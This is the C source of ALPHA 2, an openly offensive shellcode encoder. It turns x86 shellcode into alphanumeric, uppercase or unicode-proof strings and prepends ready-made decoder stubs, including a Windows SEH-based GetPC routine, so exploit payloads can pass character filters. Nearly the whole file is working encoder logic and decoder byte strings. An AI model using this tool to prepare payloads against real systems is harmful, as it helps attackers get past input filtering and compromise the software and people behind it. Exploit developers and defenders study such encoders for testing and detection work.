#include <stdio.h> // printf(), fprintf(), stderr
#include <stdlib.h> // exit(), EXIT_SUCCESS, EXIT_FAILURE, srand(), rand()
#include <string.h> // strcasecmp(), strstr()
#include <sys/time.h> //struct timeval, struct timezone, gettimeofday()

#define VERSION_STRING "ALPHA 2: Zero-tolerance. (build 07)"
#define COPYRIGHT      "Copyright (C) 2003, 2004 by Berend-Jan Wever."
/*
________________________________________________________________________________

    ,sSSs,,s,  ,sSSSs,  ALPHA 2: Zero-tolerance.
   SS"  Y$P"  SY"  ,SY
  iS'   dY       ,sS"   Unicode-proof uppercase alphanumeric shellcode encoding.
  YS,  dSb    ,sY"      Copyright (C) 2003, 2004 by Berend-Jan Wever.
  `"YSS'"S' 'SSSSSSSP   <skylined@edup.tudelft.nl>
________________________________________________________________________________

  This program is free software; you can redistribute it and/or modify it under
  the terms of the GNU General Public License version 2, 1991 as published by
  the Free Software Foundation.

  This program is distributed in the hope that it will be useful, but WITHOUT
  ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
  FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
  details.

  A copy of the GNU General Public License can be found at:
    http://www.gnu.org/licenses/gpl.html
  or you can write to:
    Free Software Foundation, Inc.
    59 Temple Place - Suite 330
    Boston, MA  02111-1307
    USA.

Acknowledgements:
  Thanks to rix for his phrack article on aphanumeric shellcode.
  Thanks to obscou for his phrack article on unicode-proof shellcode.
  Thanks to Costin Ionescu for the idea behind w32 SEH GetPC code.
  Thanks to spoonm for inspiration and suggestions, check out his 1337 perl
            conversion of ALPHA in the metasploit framework (with polymorphism!)
*/

#define mixedcase_w32sehgetpc           "VTX630VXH49HHHPhYAAQhZYYYYAAQQDDDd36" \
                                        "FFFFTXVj0PPTUPPa301089"
#define uppercase_w32sehgetpc           "VTX630WTX638VXH49HHHPVX5AAQQPVX5YYYY" \
                                        "P5YYYD5KKYAPTTX638TDDNVDDX4Z4A638618" \
                                        "16"
#define mixedcase_ascii_decoder_body    "jAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI"
#define uppercase_ascii_decoder_body    "VTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0B" \
                                        "BXP8ACJJI"
#define mixedcase_unicode_decoder_body  "jXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIA" \
                                        "IAJ11AIAIABABABQI1AIQIAIQI111AIAJQYA" \
                                        "ZBABABABABkMAGB9u4JB"
#define uppercase_unicode_decoder_body  "QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5" \
                                        "AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABAB" \
                                        "QI1AIQIAIQI1111AIAJQI1AYAZBABABABAB3" \
                                        "0APB944JB"

struct decoder {
  char* id; // id of option
  char* code; // the decoder
} mixedcase_ascii_decoders[] = {
  { "nops",     "IIIIIIIIIIIIIIIIII7" mixedcase_ascii_decoder_body },
  { "eax",      "PYIIIIIIIIIIIIIIII7QZ" mixedcase_ascii_decoder_body },
  { "ecx",      "IIIIIIIIIIIIIIIII7QZ" mixedcase_ascii_decoder_body },
  { "edx",      "JJJJJJJJJJJJJJJJJ7RY" mixedcase_ascii_decoder_body },
  { "ebx",      "SYIIIIIIIIIIIIIIII7QZ" mixedcase_ascii_decoder_body },
  { "esp",      "TYIIIIIIIIIIIIIIII7QZ" mixedcase_ascii_decoder_body },
  { "ebp",      "UYIIIIIIIIIIIIIIII7QZ" mixedcase_ascii_decoder_body },
  { "esi",      "VYIIIIIIIIIIIIIIII7QZ" mixedcase_ascii_decoder_body },
  { "edi",      "WYIIIIIIIIIIIIIIII7QZ" mixedcase_ascii_decoder_body },
  { "[esp-10]", "LLLLLLLLLLLLLLLLYIIIIIIIIIQZ" mixedcase_ascii_decoder_body },
  { "[esp-C]",  "LLLLLLLLLLLLYIIIIIIIIIIIQZ" mixedcase_ascii_decoder_body },
  { "[esp-8]",  "LLLLLLLLYIIIIIIIIIIIIIQZ" mixedcase_ascii_decoder_body },
  { "[esp-4]",  "LLLLYIIIIIIIIIIIIIIIQZ" mixedcase_ascii_decoder_body },
  { "[esp]",    "YIIIIIIIIIIIIIIIIIQZ" mixedcase_ascii_decoder_body },
  { "[esp+4]",  "YYIIIIIIIIIIIIIIII7QZ" mixedcase_ascii_decoder_body },
  { "[esp+8]",  "YYYIIIIIIIIIIIIIIIIQZ" mixedcase_ascii_decoder_body },
  { "[esp+C]",  "YYYYIIIIIIIIIIIIIII7QZ" mixedcase_ascii_decoder_body },
  { "[esp+10]", "YYYYYIIIIIIIIIIIIIIIQZ" mixedcase_ascii_decoder_body },
  { "[esp+14]", "YYYYYYIIIIIIIIIIIIII7QZ" mixedcase_ascii_decoder_body },
  { "[esp+18]", "YYYYYYYIIIIIIIIIIIIIIQZ" mixedcase_ascii_decoder_body },
  { "[esp+1C]", "YYYYYYYYIIIIIIIIIIIII7QZ" mixedcase_ascii_decoder_body },
  { "seh",      mixedcase_w32sehgetpc "IIIIIIIIIIIIIIIII7QZ" // ecx code
                mixedcase_ascii_decoder_body },
  { NULL, NULL }
}, uppercase_ascii_decoders[] = {
  { "nops",     "IIIIIIIIIIII" uppercase_ascii_decoder_body },
  { "eax",      "PYIIIIIIIIIIQZ" uppercase_ascii_decoder_body },
  { "ecx",      "IIIIIIIIIIIQZ" uppercase_ascii_decoder_body },
  { "edx",      "JJJJJJJJJJJRY" uppercase_ascii_decoder_body },
  { "ebx",      "SYIIIIIIIIIIQZ" uppercase_ascii_decoder_body },
  { "esp",      "TYIIIIIIIIIIQZ" uppercase_ascii_decoder_body },
  { "ebp",      "UYIIIIIIIIIIQZ" uppercase_ascii_decoder_body },
  { "esi",      "VYIIIIIIIIIIQZ" uppercase_ascii_decoder_body },
  { "edi",      "WYIIIIIIIIIIQZ" uppercase_ascii_decoder_body },
  { "[esp-10]", "LLLLLLLLLLLLLLLLYII7QZ" uppercase_ascii_decoder_body },
  { "[esp-C]",  "LLLLLLLLLLLLYIIII7QZ" uppercase_ascii_decoder_body },
  { "[esp-8]",  "LLLLLLLLYIIIIII7QZ" uppercase_ascii_decoder_body },
  { "[esp-4]",  "LLLL7YIIIIIIIIQZ" uppercase_ascii_decoder_body },
  { "[esp]",    "YIIIIIIIIII7QZ" uppercase_ascii_decoder_body },
  { "[esp+4]",  "YYIIIIIIIIIIQZ" uppercase_ascii_decoder_body },
  { "[esp+8]",  "YYYIIIIIIIII7QZ" uppercase_ascii_decoder_body },
  { "[esp+C]",  "YYYYIIIIIIIIIQZ" uppercase_ascii_decoder_body },
  { "[esp+10]", "YYYYYIIIIIIII7QZ" uppercase_ascii_decoder_body },
  { "[esp+14]", "YYYYYYIIIIIIIIQZ" uppercase_ascii_decoder_body },
  { "[esp+18]", "YYYYYYYIIIIIII7QZ" uppercase_ascii_decoder_body },
  { "[esp+1C]", "YYYYYYYYIIIIIIIQZ" uppercase_ascii_decoder_body },
  { "seh",      uppercase_w32sehgetpc "IIIIIIIIIIIQZ" // ecx code
                uppercase_ascii_decoder_body },
  { NULL, NULL }
}, mixedcase_ascii_nocompress_decoders[] = {
  { "nops",     "7777777777777777777777777777777777777" mixedcase_ascii_decoder_body },
  { "eax",      "PY777777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "ecx",      "77777777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "edx",      "77777777777777777777777777777777777RY" mixedcase_ascii_decoder_body },
  { "ebx",      "SY777777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "esp",      "TY777777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "ebp",      "UY777777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "esi",      "VY777777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "edi",      "WY777777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "[esp-10]", "LLLLLLLLLLLLLLLLY777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "[esp-C]",  "LLLLLLLLLLLLY7777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "[esp-8]",  "LLLLLLLLY77777777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "[esp-4]",  "LLLL7Y77777777777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "[esp]",    "Y7777777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "[esp+4]",  "YY777777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "[esp+8]",  "YYY77777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "[esp+C]",  "YYYY7777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "[esp+10]", "YYYYY777777777777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "[esp+14]", "YYYYYY77777777777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "[esp+18]", "YYYYYYY7777777777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "[esp+1C]", "YYYYYYYY777777777777777777777777777QZ" mixedcase_ascii_decoder_body },
  { "seh",      mixedcase_w32sehgetpc "77777777777777777777777777777777777QZ" // ecx code
                mixedcase_ascii_decoder_body },
  { NULL, NULL }
}, uppercase_ascii_nocompress_decoders[] = {
  { "nops",     "777777777777777777777777" uppercase_ascii_decoder_body },
  { "eax",      "PY77777777777777777777QZ" uppercase_ascii_decoder_body },
  { "ecx",      "7777777777777777777777QZ" uppercase_ascii_decoder_body },
  { "edx",      "7777777777777777777777RY" uppercase_ascii_decoder_body },
  { "ebx",      "SY77777777777777777777QZ" uppercase_ascii_decoder_body },
  { "esp",      "TY77777777777777777777QZ" uppercase_ascii_decoder_body },
  { "ebp",      "UY77777777777777777777QZ" uppercase_ascii_decoder_body },
  { "esi",      "VY77777777777777777777QZ" uppercase_ascii_decoder_body },
  { "edi",      "WY77777777777777777777QZ" uppercase_ascii_decoder_body },
  { "[esp-10]", "LLLLLLLLLLLLLLLLY77777QZ" uppercase_ascii_decoder_body },
  { "[esp-C]",  "LLLLLLLLLLLLY777777777QZ" uppercase_ascii_decoder_body },
  { "[esp-8]",  "LLLLLLLLY7777777777777QZ" uppercase_ascii_decoder_body },
  { "[esp-4]",  "LLLL7Y7777777777777777QZ" uppercase_ascii_decoder_body },
  { "[esp]",    "Y777777777777777777777QZ" uppercase_ascii_decoder_body },
  { "[esp+4]",  "YY77777777777777777777QZ" uppercase_ascii_decoder_body },
  { "[esp+8]",  "YYY7777777777777777777QZ" uppercase_ascii_decoder_body },
  { "[esp+C]",  "YYYY777777777777777777QZ" uppercase_ascii_decoder_body },
  { "[esp+10]", "YYYYY77777777777777777QZ" uppercase_ascii_decoder_body },
  { "[esp+14]", "YYYYYY7777777777777777QZ" uppercase_ascii_decoder_body },
  { "[esp+18]", "YYYYYYY777777777777777QZ" uppercase_ascii_decoder_body },
  { "[esp+1C]", "YYYYYYYY77777777777777QZ" uppercase_ascii_decoder_body },
  { "seh",      uppercase_w32sehgetpc "7777777777777777777777QZ" // ecx code
                uppercase_ascii_decoder_body },
  { NULL, NULL }
}, mixedcase_unicode_decoders[] = {
  { "nops",     "IAIAIAIAIAIAIAIAIAIAIAIAIAIA4444" mixedcase_unicode_decoder_body },
  { "eax",      "PPYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA" mixedcase_unicode_decoder_body },
  { "ecx",      "IAIAIAIAIAIAIAIAIAIAIAIAIAIA4444" mixedcase_unicode_decoder_body },
  { "edx",      "RRYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA" mixedcase_unicode_decoder_body },
  { "ebx",      "SSYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA" mixedcase_unicode_decoder_body },
  { "esp",      "TUYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA" mixedcase_unicode_decoder_body },
  { "ebp",      "UUYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA" mixedcase_unicode_decoder_body },
  { "esi",      "VVYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA" mixedcase_unicode_decoder_body },
  { "edi",      "WWYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA" mixedcase_unicode_decoder_body },
  { "[esp]",    "YAIAIAIAIAIAIAIAIAIAIAIAIAIAIA44" mixedcase_unicode_decoder_body },
  { "[esp+4]",  "YUYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA" mixedcase_unicode_decoder_body },
  { NULL, NULL }
}, uppercase_unicode_decoders[] = {
  { "nops",     "IAIAIAIA4444" uppercase_unicode_decoder_body },
  { "eax",      "PPYAIAIAIAIA" uppercase_unicode_decoder_body },
  { "ecx",      "IAIAIAIA4444" uppercase_unicode_decoder_body },
  { "edx",      "RRYAIAIAIAIA" uppercase_unicode_decoder_body },
  { "ebx",      "SSYAIAIAIAIA" uppercase_unicode_decoder_body },
  { "esp",      "TUYAIAIAIAIA" uppercase_unicode_decoder_body },
  { "ebp",      "UUYAIAIAIAIA" uppercase_unicode_decoder_body },
  { "esi",      "VVYAIAIAIAIA" uppercase_unicode_decoder_body },
  { "edi",      "WWYAIAIAIAIA" uppercase_unicode_decoder_body },
  { "[esp]",    "YAIAIAIAIA44" uppercase_unicode_decoder_body },
  { "[esp+4]",  "YUYAIAIAIAIA" uppercase_unicode_decoder_body },
  { NULL, NULL }
}, mixedcase_unicode_nocompress_decoders[] = {
  { "nops",     "444444444444444444444444444444444444444" mixedcase_unicode_decoder_body },
  { "eax",      "PPYA44444444444444444444444444444444444" mixedcase_unicode_decoder_body },
  { "ecx",      "444444444444444444444444444444444444444" mixedcase_unicode_decoder_body },
  { "edx",      "RRYA44444444444444444444444444444444444" mixedcase_unicode_decoder_body },
  { "ebx",      "SSYA44444444444444444444444444444444444" mixedcase_unicode_decoder_body },
  { "esp",      "TUYA44444444444444444444444444444444444" mixedcase_unicode_decoder_body },
  { "ebp",      "UUYA44444444444444444444444444444444444" mixedcase_unicode_decoder_body },
  { "esi",      "VVYA44444444444444444444444444444444444" mixedcase_unicode_decoder_body },
  { "edi",      "WWYA44444444444444444444444444444444444" mixedcase_unicode_decoder_body },
  { "[esp]",    "YA4444444444444444444444444444444444444" mixedcase_unicode_decoder_body },
  { "[esp+4]",  "YUYA44444444444444444444444444444444444" mixedcase_unicode_decoder_body },
  { NULL, NULL }
}, uppercase_unicode_nocompress_decoders[] = {
  { "nops",     "44444444444444" uppercase_unicode_decoder_body },
  { "eax",      "PPYA4444444444" uppercase_unicode_decoder_body },
  { "ecx",      "44444444444444" uppercase_unicode_decoder_body },
  { "edx",      "RRYA4444444444" uppercase_unicode_decoder_body },
  { "ebx",      "SSYA4444444444" uppercase_unicode_decoder_body },
  { "esp",      "TUYA4444444444" uppercase_unicode_decoder_body },
  { "ebp",      "UUYA4444444444" uppercase_unicode_decoder_body },
  { "esi",      "VVYA4444444444" uppercase_unicode_decoder_body },
  { "edi",      "WWYA4444444444" uppercase_unicode_decoder_body },
  { "[esp]",    "YA444444444444" uppercase_unicode_decoder_body },
  { "[esp+4]",  "YUYA4444444444" uppercase_unicode_decoder_body },
  { NULL, NULL }
};

struct decoder* decoders[] = {
  mixedcase_ascii_decoders, uppercase_ascii_decoders,
  mixedcase_unicode_decoders, uppercase_unicode_decoders,
  mixedcase_ascii_nocompress_decoders, uppercase_ascii_nocompress_decoders,
  mixedcase_unicode_nocompress_decoders, uppercase_unicode_nocompress_decoders
};
void version(void) {
  printf(
    "________________________________________________________________________________\n"
    "\n"
    "    ,sSSs,,s,  ,sSSSs,  " VERSION_STRING "\n"
    "   SS\"  Y$P\"  SY\"  ,SY \n"
    "  iS'   dY       ,sS\"   Unicode-proof uppercase alphanumeric shellcode encoding.\n"
    "  YS,  dSb    ,sY\"      " COPYRIGHT "\n"
    "  `\"YSS'\"S' 'SSSSSSSP   <skylined@edup.tudelft.nl>\n"
    "________________________________________________________________________________\n"
    "\n"
  );
  exit(EXIT_SUCCESS);
}

void help(char* name) {
  printf(
    "Usage: %s [OPTION] [BASEADDRESS]\n"
    "ALPHA 2 encodes your IA-32 shellcode to contain only alphanumeric characters.\n"
    "The result can optionaly be uppercase-only and/or unicode proof. It is a encoded\n"
    "version of your origional shellcode. It consists of baseaddress-code with some\n"
    "padding, a decoder routine and the encoded origional shellcode. This will work\n"
    "for any target OS. The resulting shellcode needs to have RWE-access to modify\n"
    "it's own code and decode the origional shellcode in memory.\n"
    "\n"
    "BASEADDRESS\n"
    "  The decoder routine needs have it's baseaddress in specified register(s). The\n"
    "  baseaddress-code copies the baseaddress from the given register or stack\n"
    "  location into the apropriate registers.\n"
    "eax, ecx, edx, ecx, esp, ebp, esi, edi\n"
    "  Take the baseaddress from the given register. (Unicode baseaddress code using\n"
    "  esp will overwrite the byte of memory pointed to by ebp!)\n"
    "[esp], [esp-X], [esp+X]\n"
    "  Take the baseaddress from the stack.\n"
    "seh\n"
    "  The windows \"Structured Exception Handler\" (seh) can be used to calculate\n"
    "  the baseaddress automatically on win32 systems. This option is not available\n"
    "  for unicode-proof shellcodes and the uppercase version isn't 100%% reliable.\n"
    "nops\n"
    "  No baseaddress-code, just padding.  If you need to get the baseaddress from a\n"
    "  source not on the list use this option (combined with --nocompress) and\n"
    "  replace the nops with your own code. The ascii decoder needs the baseaddress\n"
    "  in registers ecx and edx, the unicode-proof decoder only in ecx.\n"
    "-n\n"
    "  Do not output a trailing newline after the shellcode.\n"
    "--nocompress\n"
    "  The baseaddress-code uses \"dec\"-instructions to lower the required padding\n"
    "  length. The unicode-proof code will overwrite some bytes in front of the\n"
    "  shellcode as a result. Use this option if you do not want the \"dec\"-s.\n"
    "--unicode\n"
    "  Make shellcode unicode-proof. This means it will only work when it gets\n"
    "  converted to unicode (inserting a '0' after each byte) before it gets\n"
    "  executed.\n"
    "--uppercase\n"
    "  Make shellcode 100%% uppercase characters, uses a few more bytes then\n"
    "  mixedcase shellcodes.\n"
    "--sources\n"
    "  Output a list of BASEADDRESS options for the given combination of --uppercase\n"
    "  and --unicode.\n"
    "--help\n"
    "  Display this help and exit\n"
    "--version\n"
    "  Output version information and exit\n"
    "\n"
    "See the source-files for further details and copying conditions. There is NO\n"
    "warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\n"
    "\n"
    "Acknowledgements:\n"
    "  Thanks to rix for his phrack article on aphanumeric shellcode.\n"
    "  Thanks to obscou for his phrack article on unicode-proof shellcode.\n"
    "  Thanks to Costin Ionescu for the idea behind w32 SEH GetPC code.\n"
    "\n"
    "Report bugs to <skylined@edup.tudelft.nl>\n",
    name
  );
  exit(EXIT_SUCCESS);
}

//-----------------------------------------------------------------------------
int main(int argc, char* argv[], char* envp[]) {
  int   uppercase = 0, unicode = 0, sources = 0, w32sehgetpc = 0,
        nonewline = 0, nocompress = 0, options = 0, spaces = 0;
  char* baseaddress = NULL;
  int   i, input, A, B, C, D, E, F;
  char* valid_chars;

  // Random seed
  struct timeval tv;
  struct timezone tz;
  gettimeofday(&tv, &tz);
  srand((int)tv.tv_sec*1000+tv.tv_usec);

  // Scan all the options and set internal variables accordingly
  for (i=1; i<argc; i++) {
         if (strcmp(argv[i], "--help") == 0) help(argv[0]);
    else if (strcmp(argv[i], "--version") == 0) version();
    else if (strcmp(argv[i], "--uppercase") == 0) uppercase = 1;
    else if (strcmp(argv[i], "--unicode") == 0) unicode = 1;
    else if (strcmp(argv[i], "--nocompress") == 0) nocompress = 1;
    else if (strcmp(argv[i], "--sources") == 0) sources = 1;
    else if (strcmp(argv[i], "--spaces") == 0) spaces = 1;
    else if (strcmp(argv[i], "-n") == 0) nonewline = 1;
    else if (baseaddress == NULL) baseaddress = argv[i];
    else {
      fprintf(stderr, "%s: more then one BASEADDRESS option: `%s' and `%s'\n"
                      "Try `%s --help' for more information.\n",
                      argv[0], baseaddress, argv[i], argv[0]);
      exit(EXIT_FAILURE);
    }
  }

  // No baseaddress option ?
  if (baseaddress == NULL) {
    fprintf(stderr, "%s: missing BASEADDRESS options.\n"
                    "Try `%s --help' for more information.\n", argv[0], argv[0]);
    exit(EXIT_FAILURE);
  }
  // The uppercase, unicode and nocompress option determine which decoder we'll
  // need to use. For each combination of these options there is an array,
  // indexed by the baseaddress with decoders. Pointers to these arrays have
  // been put in another array, we can calculate the index into this second
  // array like this:
  options = uppercase+unicode*2+nocompress*4;
  // decoders[options] will now point to an array of decoders for the specified
  // options. The array contains one decoder for every possible baseaddress.

  // Someone wants to know which baseaddress options the specified options
  // for uppercase, unicode and/or nocompress allow:
  if (sources) {
    printf("Available options for %s%s alphanumeric shellcode:\n",
           uppercase ? "uppercase" : "mixedcase",
           unicode ? " unicode-proof" : "");
    for (i=0; decoders[options][i].id != NULL; i++) {
      printf("  %s\n", decoders[options][i].id);
    }
    printf("\n");
    exit(EXIT_SUCCESS);
  }


  if (uppercase) {
    if (spaces) valid_chars = " 0123456789BCDEFGHIJKLMNOPQRSTUVWXYZ";
    else valid_chars = "0123456789BCDEFGHIJKLMNOPQRSTUVWXYZ";
  } else {
    if (spaces) valid_chars = " 0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    else valid_chars = "0123456789BCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
  }

  // Find and output decoder
  for (i=0; strcasecmp(baseaddress, decoders[options][i].id) != 0; i++) {
    if (decoders[options][i+1].id == NULL) {
      fprintf(stderr, "%s: unrecognized baseaddress option `%s'\n"
                      "Try `%s %s%s--sources' for a list of BASEADDRESS options.\n",
                      argv[0], baseaddress, argv[0],
                      uppercase ? "--uppercase " : "",
                      unicode ? "--unicode " : "");
      exit(EXIT_FAILURE);
    }
  }
  printf("%s", decoders[options][i].code);

  // read, encode and output shellcode
  while ((input = getchar()) != EOF) {
    // encoding AB -> CD 00 EF 00
    A = (input & 0xf0) >> 4;
    B = (input & 0x0f);

    F = B;
    // E is arbitrary as long as EF is a valid character
    i = rand() % strlen(valid_chars);
    while ((valid_chars[i] & 0x0f) != F) { i = ++i % strlen(valid_chars); }
    E = valid_chars[i] >> 4;
    // normal code uses xor, unicode-proof uses ADD.
    // AB ->
    D =  unicode ? (A-E) & 0x0f : (A^E);
    // C is arbitrary as long as CD is a valid character
    i = rand() % strlen(valid_chars);
    while ((valid_chars[i] & 0x0f) != D) { i = ++i % strlen(valid_chars); }
    C = valid_chars[i] >> 4;
    printf("%c%c", (C<<4)+D, (E<<4)+F);
  }
  printf("A%s", nonewline ? "" : "\n"); // Terminating "A"

  exit(EXIT_SUCCESS);
}
